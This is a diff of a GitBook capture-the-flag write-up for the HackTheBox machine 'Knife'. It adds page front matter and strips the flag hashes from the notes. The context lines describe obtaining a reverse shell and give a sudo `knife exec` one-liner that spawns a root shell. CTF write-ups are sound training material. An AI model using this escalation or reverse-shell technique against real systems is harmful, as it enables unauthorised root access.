@@ -1,3 +1,22 @@
+---
+cover: ../../.gitbook/assets/Knife.png
+coverY: 254.84799999999998
+layout:
+  cover:
+    visible: true
+    size: hero
+  title:
+    visible: true
+  description:
+    visible: true
+  tableOfContents:
+    visible: true
+  outline:
+    visible: true
+  pagination:
+    visible: true
+---
+
 # Knife
 
 Add vhost :
@@ -69,7 +88,7 @@ if __name__ == "__main__":
 When I execute the payload, I enter `http://knife.htb`, `10.10.14.81` and `1234`. I get the reverse shell.
 
 ```sh
-cat /home/james/user.txt 	# bd969018fc8c6bc909e18a256d60b262
+cat /home/james/user.txt
 ```
 
 Result of `sudo -l` :
@@ -92,5 +111,5 @@ sudo /usr/bin/knife exec -E 'exec "/bin/bash"'
 I gain root privileges :
 
 ```sh
-cat root/root.txt	# c24b382d4f1d742936f9b154749bd6c4
+cat root/root.txt
 ```
